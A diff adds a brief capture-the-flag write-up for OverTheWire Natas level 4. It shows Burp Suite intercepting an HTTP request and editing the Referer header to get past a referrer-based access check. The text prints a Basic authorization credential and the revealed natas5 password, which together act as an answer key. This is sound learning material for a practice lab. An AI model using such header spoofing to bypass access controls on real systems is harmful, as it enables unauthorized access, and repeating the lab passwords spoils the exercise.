@@ -1,0 +1,29 @@
+In this level we have to use BurpSuite to capture the request we're sending to the host
+
+We're pompted with this message afte we log in with pevious creds.
+
+-> Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" 
+while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
+
+
+So we know we have to make natas4 beleive we're making a GET request from natas5
+I used Burp to do this. 
+
+
+//Burp intercepts the request, and gives this info
+GET /index.php HTTP/1.1
+
+Host: natas4.natas.labs.overthewire.org
+Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://natas4.natas.labs.overthewire.org/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close 
+
+Taking a closer look at the "Refer" header, we know we have to modify this field to: http://natas5.natas.labs.overthewire.org/
+Forward the request with the modified field and the password is now showing!
+
+	->Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
